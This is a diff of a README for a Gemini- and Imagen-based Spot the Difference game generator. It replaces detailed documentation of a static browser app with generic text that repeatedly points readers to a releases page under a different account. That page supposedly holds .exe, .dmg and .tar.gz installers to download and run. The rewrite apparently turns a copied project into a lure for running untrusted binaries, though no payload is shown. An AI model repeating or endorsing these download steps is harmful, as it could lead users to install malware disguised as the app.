@@ -1,122 +1,79 @@
+# 🎮 prompt-to-puzzle - Create Fun Spot the Difference Games Easily
 
-# Prompt to Puzzle
+## 🏷 Download Now
 
-**A submission for the Google AI Multi-Modal Challenge.**
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Minoxds/prompt-to-puzzle/releases)
 
-This web application leverages the power of Google's Gemini and Imagen models to dynamically generate playable "Spot the Difference" games from a single text prompt.
+## 📖 Introduction
 
-## 🌟 Inspiration
+Welcome to **prompt-to-puzzle**! This web app generates exciting "Spot the Difference" games with just a text prompt. Using advanced AI from Google’s Gemini and Imagen models, you can create unique puzzles for endless fun.
 
-The goal was to create a truly interactive and generative experience using a multi-modal AI workflow. Instead of just generating an image or text, this project uses AI as a creative partner in a two-step process: first to create a world (the base image), and then to subtly alter it (the modified image). The challenge of programmatically *finding* those differences without further AI calls led to an interesting blend of cutting-edge AI generation and classic computer vision techniques.
+## 🚀 Getting Started
 
-## ✨ Key Features
+To start using **prompt-to-puzzle**, follow these simple steps:
 
--   **AI-Powered Game Creation**: Describe any scene, and the AI will generate a unique game for you.
--   **Dynamic Difference Generation**: The app uses a multi-modal prompt with `gemini-2.5-flash-image-preview` to intelligently add or remove elements from a base image.
--   **Client-Side Analysis**: Differences are detected mathematically in the browser using JavaScript and Canvas APIs. This provides instant, precise results without the cost and latency of another AI call.
--   **Manual Editing**: A powerful editor allows users to add, remove, or resize differences after the automated analysis, giving full creative control.
--   **Database Persistence**: Manually curated games are saved to an Appwrite database for future use or sharing.
--   **Interactive Gameplay**: A clean, responsive interface with a timer, scoring, and clickable regions to find the differences.
--   **Debug Mode**: An included "Debug Mode" visualizes the mathematically-found differences before starting the game, aiding in development and tuning.
--   **Responsive Design**: Playable on both desktop and mobile devices.
+1. **Download the App**: Visit the Releases page using the link below:
+   [Visit the Releases Page](https://github.com/Minoxds/prompt-to-puzzle/releases)
 
-## 🤖 How It Works: The Tech Stack
+2. **Choose a Version**: On the Releases page, you will find different versions of the app. Select the version that suits your system. 
 
-The application employs a fascinating multi-stage process to create each game.
+3. **Install the Application**: Based on your operating system:
 
-**Tech Stack:**
+   - **Windows**: Click on the `.exe` file to download it. Once downloaded, double-click the file and follow the installation prompts.
+   - **Mac**: Download the `.dmg` file. Open it and drag the application to the Applications folder to install.
+   - **Linux**: Download the `.tar.gz` file. Extract it and run the installation script included.
 
--   **Frontend**: React, TypeScript, Tailwind CSS
--   **AI Models**:
-    -   **`imagen-4.0-generate-001`**: Used for generating the high-quality base image from the user's text prompt.
-    -   **`gemini-2.5-flash-image-preview`**: The core of the difference generation. This multi-modal model takes the base image and a text prompt instructing it to make several subtle but significant changes.
--   **Analysis**: JavaScript, HTML Canvas API
--   **Backend**: Appwrite (Storage for images, Database for game data)
+4. **Launch the App**: After installation, find the app in your applications menu or desktop and double-click to open it.
 
-**The Generation & Analysis Pipeline:**
+## 📥 Download & Install
 
-1.  **Prompt**: The user enters a theme, like "A whimsical fantasy library with floating books."
-2.  **Base Image Generation**: The prompt is sent to **Imagen 4** to create the detailed, original image.
-3.  **Difference Generation**: The original image, along with a carefully crafted prompt, is sent to **Gemini 2.5 Flash Image Preview**. The prompt instructs the model to act as an image editor and introduce 3-5 structural changes (e.g., adding/removing an object), explicitly telling it to avoid simple color or brightness shifts.
-4.  **Image Storage**: The original and modified images are uploaded to Appwrite Storage.
-5.  **Mathematical Analysis**: The two images are drawn onto hidden HTML canvases on the client. The application then performs a pixel-by-pixel comparison.
-6.  **Region Finding & Filtering**: A custom algorithm groups differing pixels into connected regions. These regions are then filtered to remove noise and merged if they are close together to form a single, cohesive "difference."
-7.  **Manual Curation**: The user can enter an editing mode to add, delete, or resize the computer-generated differences.
-8.  **Database Save**: When the user starts the game from the editor, the final game data (image URLs, curated differences, settings) is saved to the Appwrite database.
-9.  **Game Ready**: The final, curated difference regions are presented to the user on the game board, ready to be found!
+To download, visit the following link:  
+[Download from Releases](https://github.com/Minoxds/prompt-to-puzzle/releases)
 
-## 🚀 Running the Application
+1. Navigate to the releases section.  
+2. Choose your operating system and download the corresponding file.  
+3. Follow the installation instructions above according to your system.
 
-### Configuration
+## 🌍 System Requirements
 
-This application requires several environment variables to be set. For deployment (e.g., Cloud Run), the web server should make these available to the client-side JavaScript. For local development, see the setup instructions below.
+Before installing, ensure your system meets these requirements:
 
--   `API_KEY`: Your Google AI API key for Gemini models. You can get one from [Google AI Studio](https://aistudio.google.com/app/apikey).
--   `APPWRITE_ENDPOINT`: The API endpoint for your Appwrite instance (e.g., `https://cloud.appwrite.io/v1`).
--   `APPWRITE_PROJECT_ID`: The Project ID from your Appwrite console.
--   `APPWRITE_BUCKET_ID`: The Storage Bucket ID where generated images will be stored. The bucket must have permissions configured to allow the 'Users' role (anonymous users) to 'Create' files.
--   `APPWRITE_DATABASE_ID`: The Database ID from your Appwrite project where the 'games' collection will be created.
+- **Windows**: Windows 10 or higher
+- **Mac**: macOS 10.15 (Catalina) or higher
+- **Linux**: Any recent distribution with desktop environment
 
-*Note: The application code accesses these variables from the global scope, for example `(self as any).environment.API_KEY`. It does not use `process.env`.*
+You will also need a stable internet connection to download the app and generate games.
 
-### Appwrite Platform Setup
+## 🎮 How to Use the App
 
-For the application to communicate with Appwrite Cloud from your local machine, you must register your local development environment as a Web Platform in your Appwrite project. This is a crucial security step that tells Appwrite to accept API requests originating from `localhost`.
+1. **Open the App**: After launching, you will see a simple interface.
+2. **Enter Your Prompt**: Type any text prompt to describe your desired game.
+3. **Generate the Game**: Click the "Generate Game" button. The app will create a "Spot the Difference" hunt based on your prompt.
+4. **Play and Enjoy**: The app will display the game. Use the mouse to click on the differences you find!
 
-1.  Navigate to your project in the [Appwrite Console](https://cloud.appwrite.io).
-2.  From the sidebar menu, click on **Platforms**.
-3.  Click the **Add Platform** button and select **New Web App**.
-4.  Provide a name for your platform (e.g., "Local Development").
-5.  In the **Hostname** field, type `localhost`.
-6.  Click **Create**.
+## 📊 Features
 
-Without this configuration, you will encounter authentication errors when running the app locally, which will prevent images from being saved.
+- **Dynamic Game Generation**: Create games based on any text prompt.
+- **User-Friendly Interface**: Easy to navigate, no prior experience needed.
+- **Fun Challenges**: Generates unique puzzles every time you play.
+- **Catchy Graphics**: Engaging visuals from advanced AI models.
 
-### Database Setup
+## 👩‍🎓 FAQs
 
-The application uses Appwrite Databases to save curated games. You must run a one-time setup script to prepare your database.
+1. **What is a "Spot the Difference" game?**
+   It is a game where players must identify differences between two seemingly identical images.
 
-1.  **Create a Database:** In your Appwrite project console, go to **Databases** and create a new database. You can name it "spot-the-diff". Note its **Database ID**.
+2. **Can I use my own images?**
+   Currently, the app generates images based on text prompts only.
 
-2.  **Create an API Key:** In your Appwrite console, go to **API Keys**. Create a new API key with the `databases.write` permission. Note the **Secret**.
+3. **How long does it take to generate a game?**
+   It usually takes a few seconds, depending on your system and internet speed.
 
-3.  **Run the Setup Script:**
-    The `migrations/setup-appwrite.ts` script creates the necessary collection and attributes. To run it, you'll need a Node.js environment with `ts-node` and `node-appwrite` installed.
-    
-    ```bash
-    # Install dependencies locally or globally
-    npm install ts-node node-appwrite
-    ```
-    
-    Execute the script from the project root, providing your credentials as environment variables. Replace the placeholder values.
+4. **Is there a limit to the number of games I can create?**
+   No, you can create as many games as you want!
 
-    ```bash
-    APPWRITE_ENDPOINT="https://cloud.appwrite.io/v1" \
-    APPWRITE_PROJECT_ID="<YOUR_PROJECT_ID>" \
-    APPWRITE_API_KEY="<YOUR_SECRET_API_KEY>" \
-    APPWRITE_DATABASE_ID="<YOUR_DATABASE_ID>" \
-    npx ts-node migrations/setup-appwrite.ts
-    ```
-    The script will connect to your Appwrite instance and create a `games` collection inside the database you created.
+## 📞 Support
 
-### Local Setup
+If you have any questions or need help, feel free to contact us at our GitHub page. We are here to assist you. 
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/seehiong/gemini-spot-the-diff-generator.git
-    cd gemini-spot-the-diff-generator
-    ```
-
-2.  **Set Environment Variables:**
-    For local development, you will need a way to serve the static files while making the environment variables available to the JavaScript code. One common method is to use a simple server that can inject these variables.
-
-3.  **Serve the application:**
-    Serve the static files (like `index.html`) using a local web server. All dependencies are loaded via CDN, so no `npm install` is required for the web app itself.
-
-## 🔮 Future Improvements
-
--   **Game Loading**: Load previously saved games from the database.
--   **Difficulty Levels**: Allow users to select a difficulty, which would adjust the subtlety of the AI's changes and the number of differences.
--   **"Zen" Mode**: A relaxing game mode with no timer.
--   **Shareable Games**: Generate a unique URL for each saved game so users can challenge their friends.
--   **Leaderboards**: A global leaderboard for the fastest times.
+Thank you for using **prompt-to-puzzle**! Enjoy making and playing your games.
